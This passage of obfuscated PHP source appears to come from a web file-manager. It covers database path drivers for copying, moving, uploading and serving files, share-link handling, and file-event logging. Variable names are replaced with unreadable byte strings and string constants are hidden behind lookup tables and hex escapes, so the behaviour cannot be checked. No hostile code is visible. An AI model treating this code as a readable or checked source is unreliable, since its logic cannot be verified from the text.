$„ÇÁ˜¯¬[$Ê¯ı¢è[87]]); return $™‹™å‘î ? $this->getPathOuter($™‹™å‘î) : !1; } public function copy($ëÓŞé², $ÍªÊ•Ä÷, $Äö–Œğ¡ = REPEAT_REPLACE, $“±¯ôÙç = false) { $éë“ºÂÀ = $this->parse($ÍªÊ•Ä÷); $åÈº¾‘ò = $this->model->copy($ëÓŞé², $éë“ºÂÀ[$_SERVER[œ—üé‹ê][487]], $Äö–Œğ¡, $“±¯ôÙç); return $åÈº¾‘ò ? $this->getPathOuter($åÈº¾‘ò) : !1; } public function moveSameAllow() { } public function move($Æõ€…Ò€, $½öêåİ, $˜‚®£¨Ğ = REPEAT_REPLACE, $¡¼‘ùúé = false) { $¶ˆ¥“ÌÑ = $this->parse($½öêåİ); $úş¤’é‰ = $this->model->move($Æõ€…Ò€, $¶ˆ¥“ÌÑ[$_SERVER[œ—üé‹ê][487]], $˜‚®£¨Ğ, $¡¼‘ùúé); return $úş¤’é‰ ? $this->getPathOuter($úş¤’é‰) : !1; } public function remove($ÃÛÊµ¶ƒ, $³ÉüÊö = true) { return $this->model->remove($ÃÛÊµ¶ƒ, $³ÉüÊö); } public function rename($½Ú‹ü±á, $­²ÑàĞš) { $÷±ñÕØˆ = $this->model->rename($½Ú‹ü±á, $­²ÑàĞš); return $÷±ñÕØˆ ? $this->getPathOuter($½Ú‹ü±á) : $÷±ñÕØˆ; } public function size($÷øæéÙ›) { $‡ùüÅ£ = $this->infoSimple($÷øæéÙ›); return $‡ùüÅ£ ? $‡ùüÅ£[$_SERVER[œ—üé‹ê][79]] : 0; } public function infoSimple($´©¢ê“á) { return $this->model->sourceInfo($´©¢ê“á); } public function info($åÇêñ‹) { return $this->infoParse($åÇêñ‹); } public function infoAuth($İ¥™¤¨) { return $this->infoParse($İ¥™¤¨, !1, !0); } public function infoWithChildren($íÚïÓµã) { return $this->infoParse($íÚïÓµã, !0); } protected function infoParse($ ì–½ø, $×…â¾Ê˜ = false, $çĞ©¤ÂÏ = false) { if (!$×…â¾Ê˜) { return $this->model->pathInfo($ ì–½ø, $çĞ©¤ÂÏ); } return $this->model->pathInfoMore($ ì–½ø); } public function infoFullSimple($½„Ã²ØÚ) { $åƒù³Åø =& $_SERVER[œ—üé‹ê]; $ÌØ±ºåî = explode($åƒù³Åø[8], $½„Ã²ØÚ); $ÜÁõ ¸½ = implode($åƒù³Åø[8], array_splice($ÌØ±ºåî, 1)); return $this->model->pathInfoByPath($ÌØ±ºåî[0], $ÜÁõ ¸½); } public function infoFull($°Íì»¾¨) { $Ó÷ªá‘õ = $this->infoFullSimple($°Íì»¾¨); return is_array($Ó÷ªá‘õ) ? $this->model->pathInfo($Ó÷ªá‘õ[$_SERVER[œ—üé‹ê][191]]) : !1; } public function hashSimple($–şØâ«ƒ) { $Ş÷¯Ğˆ¹ =& $_SERVER[œ—üé‹ê]; $Ç’”ÇÜŸ = $this->infoWithChildren($–şØâ«ƒ); return $Ç’”ÇÜŸ[$Ş÷¯Ğˆ¹[167]][$Ş÷¯Ğˆ¹[694]]; } public function hashMd5($Œ•ĞÁäŞ) { $íœ”îüÉ =& $_SERVER[œ—üé‹ê]; $¤®™ôÇ² = $this->infoWithChildren($Œ•ĞÁäŞ); return $¤®™ôÇ²[$íœ”îüÉ[167]][$íœ”îüÉ[563]]; } public function exist($øÚš–ãÆ) { $ç¡‚•²¬ =& $_SERVER[œ—üé‹ê]; $êï†Ö€ = $this->parse($øÚš–ãÆ); if (!$êï†Ö€[$ç¡‚•²¬[87]]) { return $this->isFile($øÚš–ãÆ) || $this->isFolder($øÚš–ãÆ); } $»—Ù†™ = array($ç¡‚•²¬[492] => $êï†Ö€[$ç¡‚•²¬[487]], $ç¡‚•²¬[32] => $êï†Ö€[$ç¡‚•²¬[87]]); $µ‰Âî›™ = $this->model->where($»—Ù†™)->find(); return $µ‰Âî›™ ? !0 : !1; } public function isFile($Óı€ı›Û) { $ü¯®®ßŞ =& $_SERVER[œ—üé‹ê]; $Î°æ– = $this->infoSimple($Óı€ı›Û); return $Î°æ– && $Î°æ–[$ü¯®®ßŞ[500]] == $ü¯®®ßŞ[228] ? !0 : !1; } public function isFolder($½ÊÖ‹) { $ÏÕ•ÜÈÆ =& $_SERVER[œ—üé‹ê]; $–¢²™õÒ = $this->infoSimple($½ÊÖ‹); return $–¢²™õÒ && $–¢²™õÒ[$ÏÕ•ÜÈÆ[500]] == $ÏÕ•ÜÈÆ[91] ? !0 : !1; } public function listPath($ÕÑÔöˆÇ, $÷ª«Ÿƒó = false) { $å¯¾”æ =& $_SERVER[œ—üé‹ê]; if ($ÕÑÔöˆÇ == $å¯¾”æ[12]) { return !1; } $Çœ±¢¶ = array($å¯¾”æ[492] => $ÕÑÔöˆÇ); if ($÷ª«Ÿƒó) { return $this->model->listSource($Çœ±¢¶, -1); } return $this->model->listSource($Çœ±¢¶); } public function has($®¯»ß»û, $Ê®™öÒ = false, $šõ•„ÊĞ = null) { $ˆäåÎº =& $_SERVER[œ—üé‹ê]; $‰üÀ´Ş½ = $this->infoWithChildren($®¯»ß»û); if ($Ê®™öÒ) { return array($ˆäåÎº[240] => $‰üÀ´Ş½[$ˆäåÎº[240]], $ˆäåÎº[239] => $‰üÀ´Ş½[$ˆäåÎº[239]]); } return $šõ•„ÊĞ ? $‰üÀ´Ş½[$ˆäåÎº[240]] : $‰üÀ´Ş½[$ˆäåÎº[239]]; } public function listAll($ç¦¬Â) { $ˆ‘û£•– = IO::info($this->pathParse[$_SERVER[œ—üé‹ê][87]]); if (!$ˆ‘û£•–) { return array(); } return $this->model->listAll($ç¦¬Â); } public function getContent($Ì”ÔÅ ƒ) { return $this->model->getContent($Ì”ÔÅ ƒ); } public function setContent($œ–üı™å, $·”×Ğæ™ = '') { return $this->model->setContent($œ–üı™å, $·”×Ğæ™); } public function fileSubstr($Àë­”Ç, $á¡…™â÷, $úå–§šÉ) { return $this->model->fileSubstr($Àë­”Ç, $á¡…™â÷, $úå–§šÉ); } public function download($‹æ¥Ø, $„‡—î¾‰ = '') { $Ê¡«‰¯ = get_path_father($„‡—î¾‰); $ö§¢ï«ª = get_path_this($„‡—î¾‰); $”ƒá¯è… = $this->model->fileInfoGet($‹æ¥Ø); $…µïÒóó = IO::copy($”ƒá¯è…[$_SERVER[œ—üé‹ê][87]], $Ê¡«‰¯, !1, $ö§¢ï«ª); return $…µïÒóó; } public function setModifyTime($ŞÌ×‹©Æ, $ö±Ÿ‚Éö = '') { $¯ËìÉùÒ =& $_SERVER[œ—üé‹ê]; if (!$ŞÌ×‹©Æ) { return; } $this->model->where(array($¯ËìÉùÒ[506] => $ŞÌ×‹©Æ))->save(array($¯ËìÉùÒ[88] => $ö±Ÿ‚Éö)); } public function upload($¼£³ÒÇ, $Ÿ¬€¥§Û, $Ëè±î¹½ = false, $«“ü³ = REPEAT_REPLACE) { $‚§ŞÓ =& $_SERVER[œ—üé‹ê]; $¾ºŸã°‡ = $this->parse($¼£³ÒÇ); $ıŸİú¬¨ = $this->model->addFile($¾ºŸã°‡[$‚§ŞÓ[487]], $Ÿ¬€¥§Û, $¾ºŸã°‡[$‚§ŞÓ[87]], $Ëè±î¹½, $«“ü³); return $this->getPathOuter($ıŸİú¬¨); } public function uploadFileByID($ú«Ú’Ñ, $Âü¥şâŠ, $ˆÌ‘Â‰ı) { $ÃôÈã­Ü =& $_SERVER[œ—üé‹ê]; $ôòÈ¾ÉÓ = $this->parse($ú«Ú’Ñ); $ÙƒÉ•”ó = $this->model->addFileByFileID($ôòÈ¾ÉÓ[$ÃôÈã­Ü[487]], $Âü¥şâŠ, $ôòÈ¾ÉÓ[$ÃôÈã­Ü[87]], $ˆÌ‘Â‰ı); return $this->getPathOuter($ÙƒÉ•”ó); } public function addFileByRemote($¡­Ï»š™, $Ê›²¤Ï², $‰’Î¼ø = array(), $úÔÅ¥Ã¾ = '', $ûÃÚ´Ó¸) { $ÄŠß¥ç =& $_SERVER[œ—üé‹ê]; $„İı±í‘ = $this->parse($¡­Ï»š™); $úÔÅ¥Ã¾ = empty($úÔÅ¥Ã¾) ? $„İı±í‘[$ÄŠß¥ç[87]] : $úÔÅ¥Ã¾; $ò½ÈÉ‰ = $this->model->addFileByRemote($„İı±í‘[$ÄŠß¥ç[487]], $Ê›²¤Ï², $úÔÅ¥Ã¾, $‰’Î¼ø, $ûÃÚ´Ó¸); return $this->getPathOuter($ò½ÈÉ‰); } public function uploadLink($á­İ—„¿, $ûØªŸ„Á = 0) { $¥øÁçå =& $_SERVER[œ—üé‹ê]; $ê·èÃõ‚ = $this->parse($á­İ—„¿); $‰É¦³¢ = _get($GLOBALS[$¥øÁçå[7]], $¥øÁçå[1532]); $‹ò­¸¥³ = _get($GLOBALS[$¥øÁçå[7]], $¥øÁçå[1533]); $¤»‹ô’‹ = KodIO::ioFileDriverGet($¥øÁçå[498] . $ê·èÃõ‚[$¥øÁçå[487]] . $¥øÁçå[402]); $³–á·‹ì = Model($¥øÁçå[696])->createFileName($ê·èÃõ‚[$¥øÁçå[87]], $¤»‹ô’‹, $‰É¦³¢, $‹ò­¸¥³); return IO::uploadLink($³–á·‹ì, $ûØªŸ„Á); } public function fileNameAuto($ŞŸ­‰û, $©öÎÁÃ, $¼ª“éŒÂ = REPEAT_REPLACE, $¬ÂôÀï„ = false) { return $this->model->fileNameAuto($ŞŸ­‰û, $©öÎÁÃ, $¼ª“éŒÂ, $¬ÂôÀï„); } public function fileNameExist($òÉ„€¤ñ, $ğÜ‘òÛ) { return $this->model->fileNameExist($òÉ„€¤ñ, $ğÜ‘òÛ); } protected function _fileOut($‡§á÷ú, $äšŠÀøç = false, $ıö´ïÍï = false, $ëî‡ËëÅ = '', $•åé˜Ôô = false) { $ÊÁ€ÉÅ° =& $_SERVER[œ—üé‹ê]; $¨”É™ÒŸ = $this->model->sourceInfo($‡§á÷ú); if ($¨”É™ÒŸ[$ÊÁ€ÉÅ°[500]] == $ÊÁ€ÉÅ°[91]) { header($ÊÁ€ÉÅ°[1534]); die; } $°×Õ¶ÈŠ = $this->model->fileInfoGet($‡§á÷ú); $ëî‡ËëÅ = $°×Õ¶ÈŠ[$ÊÁ€ÉÅ°[563]] ? $°×Õ¶ÈŠ[$ÊÁ€ÉÅ°[563]] : $ëî‡ËëÅ; $âÕç»â‰ = isset($GLOBALS[$ÊÁ€ÉÅ°[180]]) && is_array($GLOBALS[$ÊÁ€ÉÅ°[180]]) ? $GLOBALS[$ÊÁ€ÉÅ°[180]][$ÊÁ€ÉÅ°[32]] : $¨”É™ÒŸ[$ÊÁ€ÉÅ°[32]]; if ($•åé˜Ôô) { return IO::fileOutServer($°×Õ¶ÈŠ[$ÊÁ€ÉÅ°[87]], $äšŠÀøç, $âÕç»â‰, $ëî‡ËëÅ); } IO::fileOut($°×Õ¶ÈŠ[$ÊÁ€ÉÅ°[87]], $äšŠÀøç, $âÕç»â‰, $ëî‡ËëÅ); } public function fileOut($îÅ’Úù¦, $ùĞ«—œ× = false, $ÙÊÃ„Ö‡ = false, $‹êœ˜î¨ = '') { $this->_fileOut($îÅ’Úù¦, $ùĞ«—œ×, $ÙÊÃ„Ö‡, $‹êœ˜î¨); } public function fileOutServer($ï™‡ãá, $Ôòäè½ğ = false, $Ãù¨§µ = false, $ìÀ…»Š = '') { $this->_fileOut($ï™‡ãá, $Ôòäè½ğ, $Ãù¨§µ, $ìÀ…»Š, !0); } protected function _fileOutImage($×”ä¸‘î, $ŸÏ“á‚… = 250) { $Ç¯Óª‚Ü =& $_SERVER[œ—üé‹ê]; $ºşŒúàó = $this->model->pathInfo($×”ä¸‘î); if ($ºşŒúàó[$Ç¯Óª‚Ü[500]] == $Ç¯Óª‚Ü[91]) { show_json($Ç¯Óª‚Ü[1535] . $×”ä¸‘î, !1); } $ïë‚ºÈõ = $this->model->fileInfoGet($×”ä¸‘î); $ºşŒúàó[$Ç¯Óª‚Ü[181]] = $ïë‚ºÈõ[$Ç¯Óª‚Ü[87]]; $GLOBALS[$Ç¯Óª‚Ü[180]] = $ºşŒúàó; IO::fileOutImage($ïë‚ºÈõ[$Ç¯Óª‚Ü[87]], $ŸÏ“á‚…); } public function fileOutImage($¯¤¯Îù, $š“üšà» = 250) { $this->_fileOutImage($¯¤¯Îù, $š“üšà»); } public function fileOutImageServer($ØŠ•èˆè, $¬ª‡¤ñ = 250) { $this->_fileOutImage($ØŠ•èˆè, $¬ª‡¤ñ); } public function link($‚£ÑŞ¾, $ÛŸèøëã = '') { $ôØíçÉã = $this->model->fileInfoGet($‚£ÑŞ¾); return IO::link($ôØíçÉã[$_SERVER[œ—üé‹ê][87]], $ÛŸèøëã); } protected function parse($ıåæÕ†²) { $¬ÎÚ½Á– =& $_SERVER[œ—üé‹ê]; if (strstr($ıåæÕ†², $¬ÎÚ½Á–[8]) === !1) { return array($¬ÎÚ½Á–[508] => intval($ıåæÕ†²), $¬ÎÚ½Á–[87] => $¬ÎÚ½Á–[12], $¬ÎÚ½Á–[1531] => array()); } $½Ôû´†Ú = explode($¬ÎÚ½Á–[8], trim($ıåæÕ†², $¬ÎÚ½Á–[8])); if (count($½Ôû´†Ú) < 2) { show_tips(clear_html($ıåæÕ†²) . $¬ÎÚ½Á–[1536]); } return array($¬ÎÚ½Á–[508] => intval($½Ôû´†Ú[0]), $¬ÎÚ½Á–[87] => $½Ôû´†Ú[1], $¬ÎÚ½Á–[1531] => array_slice($½Ôû´†Ú, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($½¶­âö­) { $this->pathParse = $½¶­âö­; $this->model = Model($_SERVER[œ—üé‹ê][1530]); } public function getPathRoot() { $†ŒÄ¨¦ =& $_SERVER[œ—üé‹ê]; return KodIO::makeShare($this->pathParse[$†ŒÄ¨¦[487]], $this->pathParse[$†ŒÄ¨¦[1356]]); } public function getPathOuter($Ù ™ØÚ“) { $–­†ıú½ =& $_SERVER[œ—üé‹ê]; if (!$Ù ™ØÚ“) { return $Ù ™ØÚ“; } $×…èó±± = $this->parse($Ù ™ØÚ“); return trim(KodIO::makeShare($this->pathParse[$–­†ıú½[487]], $×…èó±±[$–­†ıú½[487]]), $–­†ıú½[8]); } public function isParentOf($ù½ëçñÜ, $‡ê’—) { $»ş°«¢‹ = IO::init($‡ê’—); return $this->model->isParentOf($ù½ëçñÜ, $»ş°«¢‹->path); } protected function infoParse($Ûï˜Œë‘, $³®Ì— = false, $Å¥‹À¬‡ = false) { $‡ÇÊé˜å =& $_SERVER[œ—üé‹ê]; static $‰—¹«Âä = array(); $ıÕÛ„°ï = $this->pathParse[$‡ÇÊé˜å[487]]; $¤Öåµ¯Š = trim($this->pathParse[$‡ÇÊé˜å[1352]], $‡ÇÊé˜å[8]); if (isset($‰—¹«Âä[$¤Öåµ¯Š]) && is_array($‰—¹«Âä[$¤Öåµ¯Š])) { return $‰—¹«Âä[$¤Öåµ¯Š]; } $ï…©Ø¬¨ = Action($‡ÇÊé˜å[1537])->sharePathInfo($ıÕÛ„°ï, $¤Öåµ¯Š, $³®Ì—); $‰—¹«Âä[$¤Öåµ¯Š] = $ï…©Ø¬¨; return $ï…©Ø¬¨; } public function infoFull($ÆÅÉ¦ê) { $© ¨Ø€š =& $_SERVER[œ—üé‹ê]; $Û Ç™¶ = explode($© ¨Ø€š[8], trim($ÆÅÉ¦ê, $© ¨Ø€š[8])); if (count($Û Ç™¶) > 1) { $Ÿ·Šİíï = implode($© ¨Ø€š[8], array_splice($Û Ç™¶, 1)); $„Çõ’ç„ = $this->model->pathInfoByPath($Û Ç™¶[0], $Ÿ·Šİíï); if (!$„Çõ’ç„) { return !1; } $this->pathParse[$© ¨Ø€š[1352]] = $„Çõ’ç„[$© ¨Ø€š[191]]; } return $this->infoParse($ÆÅÉ¦ê); } public function listAll($­ìß±‹) { $´®åßó± =& $_SERVER[œ—üé‹ê]; $ïÙ–á— = IO::info($this->pathParse[$´®åßó±[87]]); if (!$ïÙ–á—) { return array(); } $û¸õóÖ¿ = $this->model->listAll($­ìß±‹); $óü´ÊÖ¥ = Model($´®åßó±[686])->getInfo($ïÙ–á—[$´®åßó±[687]]); foreach ($û¸õóÖ¿ as &$„²÷µ¦“) { check_abort(); $„²÷µ¦“[$´®åßó±[90]] = Action($´®åßó±[1537])->_shareItemeParse($„²÷µ¦“[$´®åßó±[90]], $óü´ÊÖ¥); } unset($„²÷µ¦“); return $û¸õóÖ¿; } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($Á©«ú) { $this->pathParse = $Á©«ú; $this->model = Model($_SERVER[œ—üé‹ê][1530]); } protected function infoParse($÷±®êçÓ, $“ßéÚ÷½ = false, $Áô†ûË = false) { $æÕ–§ß =& $_SERVER[œ—üé‹ê]; return Action($æÕ–§ß[1359])->sharePathInfo($this->pathParse[$æÕ–§ß[87]], !0, $“ßéÚ÷½); } public function listPath($ùÕ†™Ä¾, $ŠÀ®´İÑ = false) { $˜ÁªÜÀÂ =& $_SERVER[œ—üé‹ê]; $™¶±´Ï· = parent::listPath($ùÕ†™Ä¾, $ŠÀ®´İÑ); if (!$™¶±´Ï·) { return $™¶±´Ï·; } if (is_array($™¶±´Ï·[$˜ÁªÜÀÂ[977]])) { $™¶±´Ï·[$˜ÁªÜÀÂ[977]] = Action($˜ÁªÜÀÂ[1359])->shareItemInfo($™¶±´Ï·[$˜ÁªÜÀÂ[977]]); } foreach ($™¶±´Ï· as $âÙ“Š®Ñ => $Öò´Š›¹) { if (!in_array($âÙ“Š®Ñ, array($˜ÁªÜÀÂ[86], $˜ÁªÜÀÂ[85]))) { continue; } foreach ($Öò´Š›¹ as $¦»»€³î => $çß³Æ»›) { $™¶±´Ï·[$âÙ“Š®Ñ][$¦»»€³î] = Action($˜ÁªÜÀÂ[1359])->shareItemInfo($çß³Æ»›); } } return $™¶±´Ï·; } public function listAll($‘şÇü º) { $§Øù˜×¢ =& $_SERVER[œ—üé‹ê]; $Ã›°‚ú¼ = IO::info($this->pathParse[$§Øù˜×¢[87]]); if (!$Ã›°‚ú¼) { return array(); } $•Õ‡ÂØ÷ = $this->model->listAll($‘şÇü º); foreach ($•Õ‡ÂØ÷ as &$Û¤–åØã) { $Û¤–åØã[$§Øù˜×¢[90]] = Action($§Øù˜×¢[1359])->shareItemInfo($Û¤–åØã[$§Øù˜×¢[90]]); } unset($Û¤–åØã); return $•Õ‡ÂØ÷; } } goto FëáŸŞ‡õŠ; cÏÖä³Î„ß: class SourceEventModel extends ModelBase { protected $tableName = "\x69\x6f\137\163\157\165\162\143\x65\x5f\x65\x76\145\156\164"; protected $dataAuto = array(array("\x63\x72\x65\x61\x74\145\124\x69\155\x65", "\x74\151\x6d\x65", "\x69\156\x73\x65\x72\x74", "\x66\165\156\143\x74\x69\157\x6e"), array("\144\145\x73\x63", '', "\x69\x6e\163\x65\162\164\x2c\x75\x70\x64\x61\164\145\54\163\145\154\x65\x63\x74", "\152\163\x6f\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($²³²Úñø, $œÂ£íƒ÷, $³šÔüí® = '') { $’çüÚ¶Ğ =& $_SERVER[œ—üé‹ê]; if (!$this->eventSave) { return; } $êÃ­„ãÎ = Model($’çüÚ¶Ğ[1530])->sourceInfo($²³²Úñø); if (!$êÃ­„ãÎ) { return !1; } if ($this->isDisableEvent($êÃ­„ãÎ, $œÂ£íƒ÷)) { return; } if ($³šÔüí® && is_string($³šÔüí®)) { $³šÔüí® = array($’çüÚ¶Ğ[2218] => $³šÔüí®); } $áôÜÑÊ = KodUser::id(); $›§½¶ïŸ = array($’çüÚ¶Ğ[506] => $²³²Úñø, $’çüÚ¶Ğ[2408] => $êÃ­„ãÎ[$’çüÚ¶Ğ[190]], $’çüÚ¶Ğ[2409] => $êÃ­„ãÎ[$’çüÚ¶Ğ[32]], $’çüÚ¶Ğ[602] => !empty($êÃ­„ãÎ[$’çüÚ¶Ğ[602]]) ? $êÃ­„ãÎ[$’çüÚ¶Ğ[602]] : $’çüÚ¶Ğ[12], $’çüÚ¶Ğ[1965] => $áôÜÑÊ, $’çüÚ¶Ğ[511] => $œÂ£íƒ÷, $’çüÚ¶Ğ[1967] => $³šÔüí®); $this->addSystemLog($œÂ£íƒ÷, $›§½¶ïŸ); unset($›§½¶ïŸ[$’çüÚ¶Ğ[2409]], $›§½¶ïŸ[$’çüÚ¶Ğ[602]]); return $this->add($›§½¶ïŸ); } private function addSystemLog($Â’Æ¦Üû, $¼Ëµ´áı) { $ËÜ­Ù¡Ê =& $_SERVER[œ—üé‹ê]; if ($Â’Æ¦Üû == $ËÜ­Ù¡Ê[2410]) { $Â’Æ¦Üû = $¼Ëµ´áı[$ËÜ­Ù¡Ê[540]][$ËÜ­Ù¡Ê[2411]]; } else { if (in_array($Â’Æ¦Üû, array($ËÜ­Ù¡Ê[1559], $ËÜ­Ù¡Ê[2412]))) { $Â’Æ¦Üû = $¼Ëµ´áı[$ËÜ­Ù¡Ê[540]][$ËÜ­Ù¡Ê[168]]; } } $¡“Î†‡Ê = array_merge($¼Ëµ´áı, array($ËÜ­Ù¡Ê[2413] => $¼Ëµ´áı[$ËÜ­Ù¡Ê[191]], $ËÜ­Ù¡Ê[2414] => $¼Ëµ´áı[$ËÜ­Ù¡Ê[2414]])); Hook::trigger($ËÜ­Ù¡Ê[2415], $ËÜ­Ù¡Ê[2416] . $Â’Æ¦Üû, $¼Ëµ´áı); Model($ËÜ­Ù¡Ê[2126])->addLog($ËÜ­Ù¡Ê[2416] . $Â’Æ¦Üû, $¡“Î†‡Ê); } private function isDisableEvent($ŸÍöÄÚê, $‚¥¬œÊ) { $³“›äÓ´ =& $_SERVER[œ—üé‹ê]; if ($ŸÍöÄÚê[$³“›äÓ´[188]] != SourceModel::TYPE_SYSTEM) { return !1; } if ($‚¥¬œÊ == $³“›äÓ´[1330]) { return !1; } return !0; } public function eventCreate($Ş“Ÿ¨ôÙ, $Í‰™“É) { $§™ìÇ¯ =& $_SERVER[œ—üé‹ê]; $Àà–…¼ = Model($§™ìÇ¯[1530])->sourceInfo($Ş“Ÿ¨ôÙ); $ıšÓª½» = array($§™ìÇ¯[2411] => $Í‰™“É, $§™ìÇ¯[32] => $Àà–…¼[$§™ìÇ¯[32]]); return $this->addEvent($Ş“Ÿ¨ôÙ, $§™ìÇ¯[2410], $ıšÓª½»); } public function eventFileEdit($§ñİÛ–) { $­¢¶°¾® =& $_SERVER[œ—üé‹ê]; $ÜĞê™ = array($­¢¶°¾®[2417] => $_SERVER[$­¢¶°¾®[2418]], $­¢¶°¾®[2419] => strtolower(ACTION)); if (isset($GLOBALS[$­¢¶°¾®[7]][$­¢¶°¾®[1620]])) { $ÜĞê™[$­¢¶°¾®[1620]] = $­¢¶°¾®[91]; } return $this->addEvent($§ñİÛ–, $­¢¶°¾®[1558], $ÜĞê™); } public function eventRecycle($²¨Ñªøİ, $Ôâ‘¢) { return $this->addEvent($²¨Ñªøİ, $_SERVER[œ—üé‹ê][2412], $Ôâ‘¢); } private static $_removeLast = ''; public function eventRemove($ŞÅÖª÷) { $ÏÕÙÜÓ³ =& $_SERVER[œ—üé‹ê]; self::$_removeLast = $ŞÅÖª÷; $é÷›–¸Ç = Model($ÏÕÙÜÓ³[1530])->sourceInfo($ŞÅÖª÷); $ºÑ×Ğıº = array_field_key($é÷›–¸Ç, array($ÏÕÙÜÓ³[191], $ÏÕÙÜÓ³[557], $ÏÕÙÜÓ³[520], $ÏÕÙÜÓ³[604])); $ë¿Óáç = array($ÏÕÙÜÓ³[168] => $é÷›–¸Ç[$ÏÕÙÜÓ³[32]], $ÏÕÙÜÓ³[2419] => ACTION, $ÏÕÙÜÓ³[2420] => $ºÑ×Ğıº); return $this->addEvent($é÷›–¸Ç[$ÏÕÙÜÓ³[190]], $ÏÕÙÜÓ³[1330], $ë¿Óáç); } public function eventShare($ˆ½ÉŞ“Á, $²ß®°Ù±) { return $this->addEvent($ˆ½ÉŞ“Á, $_SERVER[œ—üé‹ê][1559], $²ß®°Ù±); } public function eventMove($Âîš¯œ¬, $ß†øöÀ”, $†–†Ìçç) { $„ˆ·º× =& $_SERVER[œ—üé‹ê]; if (self::$_removeLast == $Âîš¯œ¬) { return; } $ĞÒ‹–µ = Model($„ˆ·º×[1530]); $í±ªÂİÔ = $ĞÒ‹–µ->sourceInfo($Âîš¯œ¬); $ë›Ò¬ßÔ = $ĞÒ‹–µ->sourceInfo($ß†øöÀ”); $ÆˆßùÜş = $ĞÒ‹–µ->sourceInfo($†–†Ìçç); $ò‰öÁƒß = array($„ˆ·º×[1342] => $ß†øöÀ”, $„ˆ·º×[2421] => $ë›Ò¬ßÔ[$„ˆ·º×[32]], $„ˆ·º×[2379] => !empty($ë›Ò¬ßÔ[$„ˆ·º×[602]]) ? $ë›Ò¬ßÔ[$„ˆ·º×[602]] : $„ˆ·º×[12], $„ˆ·º×[1343] => $†–†Ìçç, $„ˆ·º×[2422] => $ÆˆßùÜş[$„ˆ·º×[32]], $„ˆ·º×[2423] => !empty($ÆˆßùÜş[$„ˆ·º×[602]]) ? $ÆˆßùÜş[$„ˆ·º×[602]] : $„ˆ·º×[12]); $this->addEvent($Âîš¯œ¬, $„ˆ·º×[643], $ò‰öÁƒß); $í±ªÂİÔ = $ĞÒ‹–µ->sourceInfo($Âîš¯œ¬); $ò‰öÁƒß = array($„ˆ·º×[191] => $í±ªÂİÔ[$„ˆ·º×[191]], $„ˆ·º×[32] => $í±ªÂİÔ[$„ˆ·º×[32]]); $this->addEvent($ß†øöÀ”, $„ˆ·º×[2424], $ò‰öÁƒß); } public function eventCopy($– Âª´¹) { $this->eventCreate($– Âª´¹, $_SERVER[œ—üé‹ê][641]); } public function eventRename($ã¼ü±áí, $üñİëŞ, $•èÇ³º) { $è±Ø©èë =& $_SERVER[œ—üé‹ê]; $ïù³˜ = array($è±Ø©èë[1342] => $üñİëŞ, $è±Ø©èë[1343] => $•èÇ³º); return $this->addEvent($ã¼ü±áí, $è±Ø©èë[1543], $ïù³˜); } public function eventAddComment($šÆÆ»Ş‘, $öÆ‡òÔó) { return $this->addEvent($šÆÆ»Ş‘, $_SERVER[œ—üé‹ê][2425], $öÆ‡òÔó); } public function eventAddDesc($£—Å…¼‹, $ÚÁ°ªƒ ) { return $this->addEvent($£—Å…¼‹, $_SERVER[œ—üé‹ê][2426], $ÚÁ°ªƒ ); } public function listBySource($Ö±·©€) { $éØûÊÌµ =& $_SERVER[œ—üé‹ê]; $é±ŠÛ‰ç = Model($éØûÊÌµ[1530])->sourceInfo($Ö±·©€); $¸õĞÎ‹ = array($éØûÊÌµ[506] => $Ö±·©€); if ($é±ŠÛ‰ç[$éØûÊÌµ[500]] == $éØûÊÌµ[91]) { $®š¥ÇÙØ = Model($éØûÊÌµ[1530])->listSearchChildren($Ö±·©€, 20000); $®š¥ÇÙØ[] = $Ö±·©€ . $éØûÊÌµ[463]; $¸õĞÎ‹ = array($éØûÊÌµ[191] => array($éØûÊÌµ[7], $®š¥ÇÙØ)); } $“û’ĞßÉ = $this->where($¸õĞÎ‹)->order($éØûÊÌµ[2427])->selectPage(); if ($“û’ĞßÉ[$éØûÊÌµ[443]][$éØûÊÌµ[444]] == 0) { $“û’ĞßÉ[$éØûÊÌµ[443]][$éØûÊÌµ[444]] = 1; $“û’ĞßÉ[$éØûÊÌµ[446]] = array(array($éØûÊÌµ[506] => $Ö±·©€, $éØûÊÌµ[2408] => $é±ŠÛ‰ç[$éØûÊÌµ[190]], $éØûÊÌµ[1965] => $é±ŠÛ‰ç[$éØûÊÌµ[541]], $éØûÊÌµ[511] => $éØûÊÌµ[2428], $éØûÊÌµ[512] => $é±ŠÛ‰ç[$éØûÊÌµ[231]], $éØûÊÌµ[1967] => $éØûÊÌµ[12])); } return $this->eventListParse($“û’ĞßÉ, $Ö±·©€); } private function eventListParse($Òë¾ô”Ô, $¯ìµÕº›) { $„¯©óè¡ =& $_SERVER[œ—üé‹ê]; $¬ãÆÉ¢£ = $Òë¾ô”Ô[$„¯©óè¡[446]]; $­›®Šë = array_to_keyvalue($¬ãÆÉ¢£, $„¯©óè¡[12], $„¯©óè¡[191]); $°æÚ¸ÎÁ = array_to_keyvalue($¬ãÆÉ¢£, $„¯©óè¡[12], $„¯©óè¡[2414]); foreach ($¬ãÆÉ¢£ as $“»¤ÂÁ) { $ÈõËÎ÷å = $“»¤ÂÁ[$„¯©óè¡[540]]; if ($“»¤ÂÁ[$„¯©óè¡[33]] == $„¯©óè¡[643] && isset($ÈõËÎ÷å[$„¯©óè¡[1342]])) { $­›®Šë[] = $ÈõËÎ÷å[$„¯©óè¡[1342]] . $„¯©óè¡[12]; $­›®Šë[] = $ÈõËÎ÷å[$„¯©óè¡[1343]] . $„¯©óè¡[12]; } if ($“»¤ÂÁ[$„¯©óè¡[33]] == $„¯©óè¡[2424] && isset($ÈõËÎ÷å[$„¯©óè¡[191]])) { $­›®Šë[] = $ÈõËÎ÷å[$„¯©óè¡[191]] . $„¯©óè¡[12]; } } $­›®Šë = array_merge($­›®Šë, $°æÚ¸ÎÁ, array($¯ìµÕº› . $„¯©óè¡[12])); $­›®Šë = array_unique($­›®Šë); $ŞŠıûëÔ = array_unique(array_to_keyvalue($¬ãÆÉ¢£, $„¯©óè¡[12], $„¯©óè¡[1589])); $íª†ŠÎä = Model($„¯©óè¡[617])->userListInfo($ŞŠıûëÔ); $¨·°Ïêõ = Model($„¯©óè¡[942])->sourceListInfo($­›®Šë, !0); foreach ($¬ãÆÉ¢£ as &$“»¤ÂÁ) { if ($“»¤ÂÁ[$„¯©óè¡[33]] == $„¯©óè¡[643] && 